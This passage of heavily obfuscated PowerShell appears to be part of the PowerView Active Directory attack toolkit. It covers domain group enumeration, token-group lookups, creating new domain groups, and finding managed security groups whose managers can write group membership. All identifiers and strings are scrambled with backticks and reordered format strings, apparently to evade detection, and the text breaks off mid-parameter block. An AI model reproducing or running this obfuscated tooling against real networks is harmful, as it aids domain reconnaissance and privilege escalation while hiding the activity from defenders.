        if (${P`Sb`O`U`NDpaRa`METERS}[("{1}{0}{2}{3}" -f'ea','S','r','chBase')]) { ${Se`ArcHerarg`Um`en`TS}[("{2}{1}{0}{3}"-f'chBa','ar','Se','se')] = ${s`eaR`CH`BASe} }
        if (${PS`Bou`NDPaRaMe`Ters}[("{0}{1}"-f'Ser','ver')]) { ${searCHERA`R`Gu`m`EN`Ts}[("{1}{0}"-f'ver','Ser')] = ${sErv`eR} }
        if (${PSb`o`UNd`ParamE`T`eRs}[("{0}{1}{2}" -f 'Sear','chScop','e')]) { ${Se`A`RcherA`RguMents}[("{2}{0}{1}" -f 'rch','Scope','Sea')] = ${Se`Arc`HScope} }
        if (${Psbo`UnDPA`R`AmeT`ERs}[("{0}{2}{4}{1}{3}"-f 'R','ultPageSiz','e','e','s')]) { ${S`eA`RcH`E`RArgUMEnTS}[("{2}{4}{3}{0}{1}"-f'eSi','ze','Resu','g','ltPa')] = ${reS`UltP`Ag`EsizE} }
        if (${PsboU`NdpaRaME`T`erS}[("{2}{1}{0}"-f'meLimit','i','ServerT')]) { ${S`EarC`hE`Rar`gU`mEntS}[("{3}{0}{1}{4}{2}" -f'e','rver','eLimit','S','Tim')] = ${serVErti`MEl`im`IT} }
        if (${Ps`BOun`d`pARA`meterS}[("{3}{0}{2}{4}{1}"-f 'ecuri','asks','ty','S','M')]) { ${sEAR`c`H`eRA`RGUMentS}[("{3}{1}{2}{0}" -f's','ur','ityMask','Sec')] = ${S`Ec`URITYMaSks} }
        if (${PsbO`Un`DPARAmET`E`RS}[("{1}{0}{2}" -f's','Tomb','tone')]) { ${sE`A`RChERaRgUM`E`Nts}[("{2}{0}{1}"-f 'bst','one','Tom')] = ${tO`M`BStonE} }
        if (${Ps`Bo`U`NDParam`ETERS}[("{2}{3}{1}{0}" -f 'l','dentia','C','re')]) { ${SeaR`C`He`R`Arguments}[("{0}{2}{1}"-f'Cr','al','edenti')] = ${Cre`dent`iAL} }
        ${Gr`Ou`Pse`ARcHER} = &("{4}{5}{3}{0}{2}{1}"-f'inSe','er','arch','t-Doma','G','e') @SearcherArguments
    }

    PROCESS {
        if (${Gro`UPSeA`Rcher}) {
            if (${ps`BoU`N`DpAraM`ETers}[("{1}{0}{4}{3}{2}" -f 'e','M','tity','rIden','mbe')]) {

                if (${sea`RC`hErARGUme`NTs}[("{0}{2}{1}" -f'P','rties','rope')]) {
                    ${olDprO`pErTi`Es} = ${Se`A`RChER`ArGuMe`NtS}[("{1}{0}{2}" -f 'roperti','P','es')]
                }

                ${se`ArChER`ARgu`MENtS}[("{1}{2}{0}"-f 'ntity','I','de')] = ${mEmB`E`RIdeNt`I`TY}
                ${SeArcH`Er`ArGUme`NTS}['Raw'] = ${tr`Ue}

                &("{5}{3}{4}{2}{1}{0}"-f 't','c','omainObje','et','-D','G') @SearcherArguments | &("{3}{1}{0}{2}" -f'h-Ob','c','ject','ForEa') {

                    ${O`B`jECTdi`R`ECtORYEnT`RY} = ${_}.("{0}{3}{2}{1}" -f 'G','ctoryEntry','ire','etD').Invoke()

                    ${oB`jec`TDIR`EcTOryenT`Ry}.("{1}{3}{0}{2}"-f'Cach','Refres','e','h').Invoke(("{2}{0}{1}"-f 'okenGr','oups','t'))

                    ${oBj`E`ct`dIReCT`Ory`ENTRy}."Tok`engr`OUps" | &("{3}{1}{2}{0}" -f 'ct','Ob','je','ForEach-') {

                        ${GR`OUpS`id} = (&("{0}{1}{2}" -f'New-','Obje','ct') ("{6}{7}{9}{3}{5}{10}{8}{4}{2}{0}{11}{1}" -f 'urityIde','r','ec','ec','rincipal.S','ur','Syste','m','y.P','.S','it','ntifie')(${_},0))."V`ALUe"

                        if (${Grou`p`siD} -notmatch ("{0}{1}{2}" -f'^S-','1-5-','32-.*')) {
                            ${S`EarCHE`RARgUME`NTS}[("{0}{2}{1}" -f 'Ident','y','it')] = ${g`ROU`psId}
                            ${SE`A`RChE`RArGuM`En`TS}['Raw'] = ${fA`L`Se}
                            if (${OldpRo`P`e`R`TiEs}) { ${S`eaR`chEraRg`UmeNtS}[("{2}{0}{1}"-f 'roperti','es','P')] = ${oldpr`Op`eR`TI`es} }
                            ${gr`Oup} = &("{1}{3}{0}{2}" -f'omain','Get','Object','-D') @SearcherArguments
                            if (${GR`o`Up}) {
                                ${G`Ro`UP}."P`SoBjECt"."t`Yp`EnAMes".("{0}{2}{1}" -f 'I','rt','nse').Invoke(0, ("{2}{0}{1}" -f'werView','.Group','Po'))
                                ${G`R`oUp}
                            }
                        }
                    }
                }
            }
            else {
                ${Id`eNtitYf`iLTeR} = ''
                ${f`I`LtER} = ''
                ${i`d`eNtity} | &("{0}{1}{2}{3}"-f'Wh','ere-Ob','je','ct') {${_}} | &("{2}{0}{1}" -f 'ch','-Object','ForEa') {
                    ${ide`NTiT`YIns`Ta`NcE} = ${_}.("{1}{0}" -f'e','Replac').Invoke('(', '\28').("{1}{0}{2}"-f'ep','R','lace').Invoke(')', '\29')
                    if (${i`dEN`TIT`YI`NStaNCe} -match ("{1}{0}"-f'S-1-','^')) {
                        ${iden`TITyf`il`TEr} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${IDe`NTIt`Yinst`A`Nce} -match ("{1}{0}" -f'=','^CN')) {
                        ${IDE`Nti`TyfI`lTer} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${PSb`oUnDpa`RA`me`TERs}[("{1}{0}" -f'n','Domai')]) -and (-not ${p`SbOUndpaRA`Me`T`e`Rs}[("{0}{3}{1}{2}" -f 'Se','Bas','e','arch')])) {

                            ${ideNTit`YD`oMA`iN} = ${ID`EN`TiTy`InstAN`Ce}.("{1}{2}{0}" -f'ng','SubStr','i').Invoke(${idEN`T`IT`YINSTANCE}.("{1}{2}{0}" -f 'f','Index','O').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{2}{1}{0}"-f 'se','rbo','Write-Ve') ('[Get-D'+'oma'+'i'+'nG'+'roup] '+'Ex'+'tracted'+' '+'d'+'omai'+'n '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                            ${S`eA`R`cHeRARguMEN`TS}[("{0}{1}{2}"-f'Doma','i','n')] = ${ident`IT`YDom`AiN}
                            ${gR`OuP`SE`A`RCHEr} = &("{1}{3}{2}{0}"-f 'nSearcher','Get-Do','i','ma') @SearcherArguments
                            if (-not ${gR`OuP`sea`RC`HEr}) {
                                &("{1}{0}{2}{3}"-f'it','Wr','e-','Warning') ('[Get'+'-Dom'+'ainGr'+'oup] '+'Un'+'a'+'ble '+'t'+'o '+'re'+'trieve'+' '+'domain'+' '+'s'+'earche'+'r '+'for'+' '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${Id`eNTi`TYinST`Ance} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${G`U`idByTEs`T`RING} = (([Guid]${idEnTityI`N`s`Ta`NCe}).("{2}{0}{1}" -f 'eAr','ray','ToByt').Invoke() | &("{3}{1}{0}{2}" -f'rEach','o','-Object','F') { '\' + ${_}.("{2}{0}{1}"-f 'Str','ing','To').Invoke('X2') }) -join ''
                        ${i`deN`TItyf`ILTER} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${iden`TiTY`INSt`A`NCE}.("{1}{2}{0}"-f 'tains','C','on').Invoke('\')) {
                        ${cO`NV`eR`Te`Di`dEnTiT`YInSt`AncE} = ${IdeNTItY`INst`A`Nce}.("{0}{1}{2}"-f'Re','pl','ace').Invoke('\28', '(').("{1}{0}{2}"-f'pla','Re','ce').Invoke('\29', ')') | &("{2}{3}{4}{0}{1}" -f 'ADNa','me','C','onv','ert-') -OutputType ("{2}{1}{0}" -f'al','nic','Cano')
                        if (${coNv`erTedI`D`En`TityIN`s`TAnCE}) {
                            ${GrOup`D`OMain} = ${conveRTEd`IDeN`Ti`T`y`In`StAN`cE}.("{0}{1}{2}"-f'SubSt','ri','ng').Invoke(0, ${Co`NvER`TediD`eN`TItYInstan`cE}.("{1}{0}"-f'xOf','Inde').Invoke('/'))
                            ${Group`NA`mE} = ${idE`NtI`T`YiNStanCE}.("{0}{1}" -f'Spl','it').Invoke('\')[1]
                            ${ide`N`TITy`FIlteR} += "(samAccountName=$GroupName)"
                            ${searc`HEr`AR`Gu`ME`NTS}[("{2}{0}{1}"-f 'a','in','Dom')] = ${gr`OUPdOM`A`IN}
                            &("{0}{2}{3}{1}" -f'Writ','se','e-','Verbo') ('[Get-Doma'+'i'+'nGr'+'ou'+'p'+'] '+'E'+'xtracted'+' '+'dom'+'ai'+'n '+"'$GroupDomain' "+'fro'+'m '+"'$IdentityInstance'")
                            ${GrOups`EA`R`Cher} = &("{2}{1}{0}{3}" -f 'ai','m','Get-Do','nSearcher') @SearcherArguments
                        }
                    }
                    else {
                        ${iD`e`NTiT`yfilTER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if (${idE`NtITYF`I`lter} -and (${idENtIty`F`ILT`er}.("{0}{1}" -f 'Tr','im').Invoke() -ne '') ) {
                    ${f`Il`Ter} += "(|$IdentityFilter)"
                }

                if (${ps`Bou`N`DpA`RAMEt`ERs}[("{2}{1}{3}{0}" -f'ount','dm','A','inC')]) {
                    &("{0}{2}{4}{3}{1}" -f 'Writ','se','e','erbo','-V') ("{9}{7}{1}{8}{3}{2}{11}{4}{10}{5}{6}{0}"-f't=1','inGrou',' Se',']','or a','Co','un','oma','p','[Get-D','dmin','arching f')
                    ${f`IlTEr} += ("{1}{0}{2}{3}{4}"-f'i','(adm','ncount','=','1)')
                }
                if (${pSBOUnDPA`R`AM`ET`eRS}[("{2}{1}{0}" -f'e','cop','GroupS')]) {
                    ${grO`UpsCoP`eva`LUe} = ${psbOuNd`pARAM`e`TErS}[("{0}{1}{2}" -f 'Gr','ou','pScope')]
                    ${fI`l`TeR} = Switch (${G`R`OU`PsC`OPevALUe}) {
                        ("{1}{2}{0}" -f'inLocal','Dom','a')       { (("{4}{6}{0}{2}{5}{1}{3}" -f':1.2.84','.4.803:','0.113556','=4)','(gro','.1','upType')) }
                        ("{0}{1}{3}{2}"-f 'NotD','omain','al','Loc')    { ("{1}{2}{5}{8}{7}{0}{4}{3}{6}" -f '5','(!(groupType:1.2','.84','803:=4','6.1.4.','0.','))','135','1') }
                        ("{1}{0}" -f'lobal','G')            { ("{2}{9}{7}{8}{4}{3}{11}{10}{1}{6}{0}{5}" -f'=2','.4','(g','1135','0.',')','.803:','pe:1.2.','84','roupTy','1','56.') }
                        ("{2}{1}{3}{0}" -f 'al','o','N','tGlob')         { ("{0}{4}{6}{1}{3}{5}{2}" -f '(!(','.2.',')','840.113556.1.4','groupType','.803:=2)',':1') }
                        ("{0}{2}{1}"-f 'Univ','l','ersa')         { (("{8}{9}{6}{2}{3}{0}{1}{4}{7}{5}"-f '55','6.1',':1','.2.840.113','.4',':=8)','e','.803','(g','roupTyp')) }
                        ("{0}{1}{2}{3}" -f 'Not','Unive','rs','al')      { ((("{8}{0}{4}{2}{7}{3}{6}{5}{1}" -f'r','))','Type:1.2.8','11','oup','=8','3556.1.4.803:','40.','(!(g'))) }
                    }
                    &("{3}{4}{2}{1}{0}" -f 'e','s','o','Write-Ver','b') ('[Get'+'-DomainG'+'rou'+'p] '+'Search'+'in'+'g '+'for'+' '+'gro'+'up '+'scope'+' '+"'$GroupScopeValue'")
                }
                if (${psbO`UNDpAr`A`M`EtErS}[("{3}{0}{1}{2}{4}" -f'r','o','per','GroupP','ty')]) {
                    ${g`ROUPPr`OpEr`TyVAl`Ue} = ${PsBO`UNdpa`RA`m`eTeRS}[("{3}{1}{0}{4}{2}" -f 'P','up','ty','Gro','roper')]
                    ${FIl`Ter} = Switch (${Gr`oU`pPROpeR`T`yvaLUE}) {
                        ("{1}{0}" -f'ecurity','S')              { ("{6}{2}{13}{0}{11}{8}{4}{7}{1}{12}{5}{9}{3}{10}"-f'pT','4.803:=','g','364','40.113','7','(','556.1.','2.8','48','8)','ype:1.','214','rou') }
                        ("{2}{1}{0}" -f'on','stributi','Di')          { ("{4}{7}{6}{5}{10}{0}{8}{12}{13}{1}{3}{11}{2}{9}" -f'.','4.803','48',':=2147483','(!(g','.84','2','roupType:1.','11','))','0','6','3556.','1.') }
                        ("{0}{2}{3}{1}" -f 'Created','em','B','ySyst')       { (("{4}{0}{7}{1}{2}{5}{6}{3}" -f'oupTyp','1.','2.840.','3:=1)','(gr','113556.','1.4.80','e:')) }
                        ("{2}{0}{5}{4}{1}{3}"-f'r','ByS','NotC','ystem','ated','e')    { ((("{4}{7}{8}{6}{5}{0}{1}{3}{2}" -f '556','.1.4.803:','))','=1','(!',':1.2.840.113','pType','(','grou'))) }
                    }
                    &("{3}{2}{1}{0}" -f'erbose','e-V','rit','W') ('[Ge'+'t-D'+'oma'+'inGro'+'up] '+'S'+'earchin'+'g '+'fo'+'r '+'grou'+'p'+' '+'prop'+'er'+'ty '+"'$GroupPropertyValue'")
                }
                if (${pS`B`OuNdp`ARAMEtErs}[("{3}{1}{2}{0}"-f'lter','F','i','LDAP')]) {
                    &("{0}{2}{4}{1}{3}" -f'W','b','r','ose','ite-Ver') ('[G'+'et'+'-DomainG'+'ro'+'u'+'p] '+'U'+'sing '+'addi'+'t'+'ion'+'al '+'LDA'+'P '+'fil'+'ter:'+' '+"$LDAPFilter")
                    ${FIl`T`ER} += "$LDAPFilter"
                }

                ${gRouPsE`AR`ch`ER}."Fi`LtEr" = "(&(objectCategory=group)$Filter)"
                &("{0}{3}{1}{2}" -f'Wr','o','se','ite-Verb') "[Get-DomainGroup] filter string: $($GroupSearcher.filter) "

                if (${PSbo`Un`dPA`Rame`TeRS}[("{0}{1}" -f 'FindO','ne')]) { ${Re`s`ULTS} = ${grO`Upse`A`RcHEr}.("{0}{2}{1}"-f'F','dOne','in').Invoke() }
                else { ${r`Esu`Lts} = ${gROU`p`se`ARch`ER}.("{1}{0}"-f'l','FindAl').Invoke() }
                ${RE`suL`Ts} | &("{0}{1}{2}" -f 'Wher','e-Obj','ect') {${_}} | &("{0}{4}{3}{2}{1}" -f'ForEach','t','ec','j','-Ob') {
                    if (${psboUnDPArAm`Et`e`Rs}['Raw']) {

                        ${GRo`UP} = ${_}
                    }
                    else {
                        ${GR`OuP} = &("{0}{2}{1}{3}"-f'C','rt-LD','onve','APProperty') -Properties ${_}."pRopE`Rt`i`eS"
                    }
                    ${gRo`Up}."PsobJ`EcT"."tyP`Ena`MeS".("{1}{0}"-f'ert','Ins').Invoke(0, ("{3}{0}{2}{1}" -f'rVi','w.Group','e','Powe'))
                    ${G`RO`UP}
                }
                if (${rEsU`l`TS}) {
                    try { ${rES`U`lTs}.("{2}{0}{1}" -f 'i','spose','d').Invoke() }
                    catch {
                        &("{2}{0}{1}{3}" -f'i','te-V','Wr','erbose') ("{0}{7}{5}{3}{9}{4}{12}{10}{6}{1}{2}{11}{8}"-f'[Get-DomainGr',' ','o','or di','g of t','r','s','oup] Er','ject','sposin','lt','b','he Resu')
                    }
                }
                ${g`RoUP`sEaRCHer}.("{2}{1}{0}"-f'pose','s','di').Invoke()
            }
        }
    }
}

function n`EW-dom`AIN`gr`oUp {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{1}{4}{3}{0}{6}{10}{2}{11}{7}{9}{8}"-f'r','se','F','houldP','S','PSU','oc','rSt','ingFunctions','ateChang','ess','o'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}"-f'ouldProcess','SSh','P'}, '')]
    [OutputType({"{7}{3}{9}{1}{4}{5}{8}{0}{6}{2}"-f'ro','n','ncipal','yServices.A','tMa','nagemen','upPri','Director','t.G','ccou'})]
    Param(
        [Parameter(MAnDAtory = ${T`RuE})]
        [ValidateLength(0, 256)]
        [String]
        ${sA`mACcOUNTN`AMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${nA`Me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`isPLAyNA`mE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dEScR`Ipti`On},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oMa`in},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`edeNt`iaL} =   (&("{0}{2}{1}" -f'var','bLe','Ia') ('pkfE'+'zN'))."Va`LUE"::"E`MptY"
    )

    ${Con`Tex`Tar`guM`Ents} = @{
        ("{1}{0}" -f'y','Identit') = ${s`AMac`couNtn`A`ME}
    }
    if (${Ps`BOUn`dP`AR`AmetErS}[("{1}{0}"-f'in','Doma')]) { ${C`OntEx`TaRg`Ume`NTs}[("{0}{1}" -f'Domai','n')] = ${d`OM`Ain} }
    if (${P`S`BOuN`DP`ArAMeTe`RS}[("{2}{0}{1}"-f 'de','ntial','Cre')]) { ${C`O`N`TExtargU`M`ENTs}[("{0}{2}{1}{3}"-f 'Credent','a','i','l')] = ${C`REDEn`TiAL} }
    ${Co`NT`ext} = &("{1}{2}{6}{4}{0}{5}{3}" -f'e','Get-','Pr','t','Cont','x','incipal') @ContextArguments

    if (${c`ont`EXT}) {
        ${GR`oup} = &("{2}{1}{0}" -f'ct','bje','New-O') -TypeName ("{6}{15}{9}{7}{0}{11}{1}{4}{14}{5}{13}{8}{3}{10}{2}{12}"-f're','ry','pPrinci','nt.Gr','Services.Account','n','S','Di','eme','em.','ou','cto','pal','ag','Ma','yst') -ArgumentList (${cO`Nt`eXt}."cON`TE`xt")

        ${g`RO`UP}."s`Am`AcCOUNTN`AMe" = ${C`oNTe`Xt}."idEn`TIty"

        if (${ps`BouNdPaR`A`M`eterS}[("{1}{0}" -f'me','Na')]) {
            ${g`Ro`UP}."n`AmE" = ${N`AME}
        }
        else {
            ${gr`oup}."nA`Me" = ${CO`NTEXT}."IDen`T`ity"
        }
        if (${p`SBO`Undp`Ar`AmeTerS}[("{3}{0}{1}{2}" -f'lay','Nam','e','Disp')]) {
            ${Gro`UP}."Disp`l`A`ynaME" = ${dIsPLa`y`NA`ME}
        }
        else {
            ${gro`Up}."dIsP`laY`N`AmE" = ${CO`NTEXt}."id`entI`Ty"
        }

        if (${P`SBOUN`DPaRaMeTE`Rs}[("{1}{2}{0}{3}"-f'pti','Descr','i','on')]) {
            ${GrO`UP}."dESCr`IPti`on" = ${DE`ScRIpTI`on}
        }

        &("{0}{2}{1}{3}"-f'W','te-Verbo','ri','se') ('[Ne'+'w-Do'+'main'+'G'+'ro'+'up] '+'Attem'+'p'+'ting '+'t'+'o '+'cre'+'ate'+' '+'gro'+'up '+"'$SamAccountName'")
        try {
            ${nu`ll} = ${g`RouP}.("{0}{1}"-f 'Sa','ve').Invoke()
            &("{2}{3}{1}{0}"-f'e','erbos','Wri','te-V') ('[New'+'-Dom'+'ai'+'nGrou'+'p] '+'G'+'roup '+"'$SamAccountName' "+'suc'+'c'+'ess'+'full'+'y '+'cre'+'ated')
            ${grO`Up}
        }
        catch {
            &("{0}{4}{1}{2}{3}"-f'Wri','W','arni','ng','te-') ('[Ne'+'w-D'+'omai'+'nG'+'roup] '+'Erro'+'r '+'c'+'reating '+'gr'+'oup '+"'$SamAccountName' "+': '+"$_")
        }
    }
}

function g`ET-D`OmAInmAnA`GeDs`ECuRIt`yGrOuP {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}" -f'oc','ess','uldPr','PSSho'}, '')]
    [OutputType({"{1}{7}{6}{2}{5}{3}{0}{4}"-f 'urityGro','PowerV','.Manage','c','up','dSe','ew','i'})]
    [CmdletBinding()]
    Param(
        [Parameter(posITIon = 0, VAlueFrOMpIPeLinE = ${t`RUe}, vALUEFRompIpeLineBypROPeRTYNAME = ${TR`UE})]
        [Alias({"{1}{0}" -f'ame','N'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${domA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'S','Path','AD'})]
        [String]
        ${S`ea`RcHB`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{4}{3}{1}{0}"-f'r','lle','DomainCo','tro','n'})]
        [String]
        ${SErV`Er},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{2}{1}{0}"-f'vel','neLe','O'}, {"{1}{0}"-f'tree','Sub'})]
        [String]
        ${SeArC`HsC`o`pE} = ("{1}{0}" -f'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`SUl`TpA`GES`izE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERvErT`Ime`lI`mIT},

        [Switch]
        ${t`OMBs`Tone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReDE`Nt`iAl} =   (&("{0}{2}{1}" -f 'g','aBle','ET-VarI')  ("pK"+"fE"+"zn")  -ValueO )::"eM`Pty"
    )

    BEGIN {
        ${se`ARcHer`A`RgUMENTs} = @{
            ("{0}{1}{2}{3}" -f 'LDAP','F','il','ter') = (("{1}{16}{2}{4}{13}{0}{9}{7}{6}{15}{8}{3}{12}{5}{10}{17}{11}{14}{18}" -f ')','(&(ma','agedB','.11','y','803:=','upT','ro','0','(g','2','748','3556.1.4.','=*','3648','ype:1.2.84','n','14','))'))
            ("{2}{1}{0}"-f'erties','p','Pro') = ("{1}{8}{11}{10}{6}{7}{4}{3}{2}{0}{5}{9}" -f 'a','disting','ounttype,sam','macc','a','ccountna','nagedBy,','s','uish','me','a','edName,m')
        }
        if (${PSb`oUNDpaRa`me`TerS}[("{2}{1}{0}"-f 'rchBase','ea','S')]) { ${sEArCh`E`RA`RGU`MeNTs}[("{2}{0}{1}"-f 'ear','chBase','S')] = ${s`E`ArcHbaSe} }
        if (${PsB`o`UNd`P`AraMETErs}[("{0}{1}"-f'Serv','er')]) { ${S`EarCH`e`RaRg`U`MENtS}[("{1}{0}"-f'r','Serve')] = ${SERv`eR} }
        if (${pS`B`oUNDPAR`Am`e`TerS}[("{0}{1}{2}" -f'Se','arch','Scope')]) { ${sEArC`he`RArgUmEn`TS}[("{2}{0}{1}" -f 'rchS','cope','Sea')] = ${s`e`ArCh`scopE} }
        if (${p`sBoUN`dPAra`mETERs}[("{1}{3}{0}{2}" -f'eS','Resul','ize','tPag')]) { ${sEArcH`e`RArg`Um`EN`TS}[("{1}{2}{0}" -f'ageSize','Res','ultP')] = ${r`EsuLT`pAg`EsI`ZE} }
        if (${pSbO`Un`DPARA`MeTeRs}[("{2}{0}{1}" -f 'verTimeLim','it','Ser')]) { ${SE`ArCH`EraRG`UmENtS}[("{2}{0}{4}{3}{1}"-f'e','mit','S','rTimeLi','rve')] = ${SErVErTi`Me`lI`MIT} }
        if (${PS`BOuN`D`pa`Ra`mEtErs}[("{1}{0}{4}{3}{2}" -f 'curity','Se','s','k','Mas')]) { ${seArcHEr`ArG`U`M`enTS}[("{3}{0}{2}{1}" -f 'curity','s','Mask','Se')] = ${seC`UriTY`MAS`Ks} }
        if (${pSB`ou`ND`pAr`AmeT`ERs}[("{1}{0}{3}{2}" -f 'b','Tom','e','ston')]) { ${SEA`Rch`ERArG`UME`NtS}[("{2}{1}{0}"-f 'ne','to','Tombs')] = ${to`MBsT`oNe} }
        if (${P`s`BOundpAramE`TeRs}[("{1}{0}{2}" -f 'dentia','Cre','l')]) { ${S`E`ARCh`erAR`g`UMEnts}[("{3}{1}{2}{0}" -f'ntial','d','e','Cre')] = ${Cr`EDe`NtIaL} }
    }

    PROCESS {
        if (${pSbOUnd`PaRA`M`eteRs}[("{0}{1}"-f 'Doma','in')]) {
            ${se`A`RCHeraR`gUM`E`NTS}[("{1}{0}"-f'ain','Dom')] = ${DO`mA`in}
            ${t`ARge`T`doM`Ain} = ${Do`MA`In}
        }
        else {
            ${taRG`eTdO`m`AIN} = ${e`NV`:use`RdnSd`oma`In}
        }

        &("{1}{3}{2}{0}" -f'p','Get-','Grou','Domain') @SearcherArguments | &("{0}{1}{3}{2}"-f 'ForEac','h','t','-Objec') {
            ${SEar`CH`ERar`gumE`NTs}[("{0}{2}{1}" -f 'Propert','es','i')] = ("{7}{13}{16}{10}{12}{1}{4}{2}{3}{14}{9}{18}{8}{11}{17}{0}{6}{15}{5}"-f ',o','e','name',',sam',',','d','b','dist','accou','un','hedn','ntn','am','ingui','acco','jectsi','s','ame','ttype,sam')
            ${SeAR`CHEr`Argumen`Ts}[("{2}{0}{1}"-f'nti','ty','Ide')] = ${_}."Ma`N`AgedbY"
            ${Nu`lL} = ${sEAR`chE`RaRG`Um`entS}.("{0}{1}" -f 'R','emove').Invoke(("{2}{1}{3}{0}"-f 'lter','DA','L','PFi'))

            ${GR`oUp`m`An`AGer} = &("{1}{0}{2}{4}{3}"-f'e','G','t-','ject','DomainOb') @SearcherArguments

            ${M`A`NaGEdg`Ro`UP} = &("{2}{0}{1}"-f 'O','bject','New-') ("{0}{2}{1}" -f'PS','t','Objec')
            ${MANAG`ed`Gr`OuP} | &("{0}{2}{1}" -f 'Ad','mber','d-Me') ("{1}{3}{0}{2}"-f 'op','Notep','erty','r') ("{0}{1}" -f 'G','roupName') ${_}."SA`MACCou`NTNA`ME"
            ${MaN`AgEDGR`ouP} | &("{2}{1}{0}{3}"-f'-Mem','dd','A','ber') ("{0}{1}{2}"-f'No','te','property') ("{2}{0}{1}{3}" -f 'upDistingu','ishedNam','Gro','e') ${_}."DIst`ingU`Is`He`dna`ME"
            ${ManAg`e`DgrO`Up} | &("{0}{3}{2}{1}" -f 'Add','r','Membe','-') ("{1}{0}{2}{3}"-f't','No','e','property') ("{3}{1}{2}{0}" -f 'erName','a','nag','M') ${gR`OUPm`A`N`AGER}."sAmacCo`U`NTnAmE"
            ${mANa`Ged`g`Ro`UP} | &("{2}{0}{1}" -f'emb','er','Add-M') ("{0}{1}{3}{2}" -f'Not','e','y','propert') ("{7}{3}{6}{0}{1}{5}{2}{4}"-f 'Disti','n','uished','ana','Name','g','ger','M') ${g`RoUPMan`AG`er}."dIsTi`Ng`UisHEDN`Ame"

            if (${G`Roup`manAGer}."S`AMA`C`COUNtTyPe" -eq 0x10000000) {
                ${MANAGe`Dg`Ro`Up} | &("{2}{0}{3}{1}" -f 'd','r','Ad','-Membe') ("{0}{3}{2}{1}" -f 'No','erty','prop','te') ("{3}{0}{1}{2}" -f 'Ty','p','e','Manager') ("{1}{0}"-f 'oup','Gr')
            }
            elseif (${gR`OuP`m`An`AgeR}."Sa`MaCcou`N`TTyPe" -eq 0x30000000) {
                ${Manag`edgR`O`UP} | &("{0}{1}{2}" -f 'Add-M','emb','er') ("{0}{1}{2}{3}" -f 'N','ote','proper','ty') ("{0}{1}{2}{3}" -f 'Manager','T','yp','e') ("{1}{0}"-f 'r','Use')
            }

            ${aCl`A`RGu`MEn`TS} = @{
                ("{2}{0}{1}" -f 'ntit','y','Ide') = ${_}."DI`StinGU`isHedN`Ame"
                ("{2}{3}{1}{0}"-f 'ter','sFil','Ri','ght') = ("{3}{1}{0}{2}"-f 'er','emb','s','WriteM')
            }
            if (${psb`OUn`D`ParAMEterS}[("{2}{1}{0}" -f'er','rv','Se')]) { ${A`CLaRgU`M`Ents}[("{1}{0}" -f 'erver','S')] = ${Se`RV`er} }
            if (${P`Sbo`UND`PA`Rame`Ters}[("{1}{3}{0}{2}" -f'co','Sear','pe','chS')]) { ${ACLAr`G`UMEn`Ts}[("{0}{2}{1}" -f'SearchSc','e','op')] = ${se`Ar`CHSCope} }
            if (${pSBOUnDp`ARa`mE`T`ERs}[("{2}{4}{3}{1}{0}"-f 'e','Siz','Resu','age','ltP')]) { ${a`ClaRG`UmE`NTS}[("{0}{1}{2}"-f 'Re','sultPageS','ize')] = ${RESUl`TPa`gEs`IzE} }
            if (${PsBOuNdpA`RAmET`E`Rs}[("{0}{2}{1}{3}"-f 'Serve','imeL','rT','imit')]) { ${aclA`RGu`menTs}[("{0}{3}{2}{1}"-f 'ServerTim','it','im','eL')] = ${sErve`RT`IM`eLIm`IT} }
            if (${PsBoUn`d`PAR`AMEtE`Rs}[("{0}{2}{1}" -f'To','tone','mbs')]) { ${acLArg`U`mENts}[("{2}{0}{3}{1}"-f'mb','e','To','ston')] = ${t`OM`Bstone} }
            if (${pS`BOuN`DP`ArA`M`Eters}[("{2}{3}{0}{1}"-f 'a','l','C','redenti')]) { ${a`Cl`ARg`U`mENTS}[("{0}{2}{1}"-f 'Credenti','l','a')] = ${crE`d`enti`AL} }

            ${MAn`AGE`dGRoUP} | &("{2}{1}{0}"-f'r','-Membe','Add') ("{1}{2}{0}"-f'rty','No','teprope') ("{0}{1}{2}"-f'Manager','CanW','rite') ("{0}{1}{2}"-f'UN','KNOW','N')

            ${m`A`NAgE`DgROUp}."Ps`o`BjeCt"."T`yPen`Ames".("{0}{2}{1}" -f 'Inse','t','r').Invoke(0, ("{5}{3}{1}{0}{4}{2}"-f 'ew.Man','erVi','ecurityGroup','w','agedS','Po'))
            ${mAN`Age`D`grOUP}
        }
    }
}

function GeT-do`mAingrOu`pMEMb`Er {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}{4}"-f 'Sho','PS','roces','uldP','s'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{6}{4}{0}{5}" -f'Assignmen','Decl','P','SUse','han','ts','aredVarsMoreT'}, '')]
    [OutputType({"{4}{0}{1}{5}{3}{2}"-f'rView','.Gro','er','mb','Powe','upMe'})]
    [CmdletBinding(deFaUlTPaRAMetErSetNaMe = {"{0}{1}" -f'Non','e'})]
    Param(
        [Parameter(pOSITiOn = 0, maNdAtorY = ${t`RuE}, ValuefrOMPIpELinE = ${TR`Ue}, valuefrOmpipElInEbYproPeRTYname = ${TR`UE})]
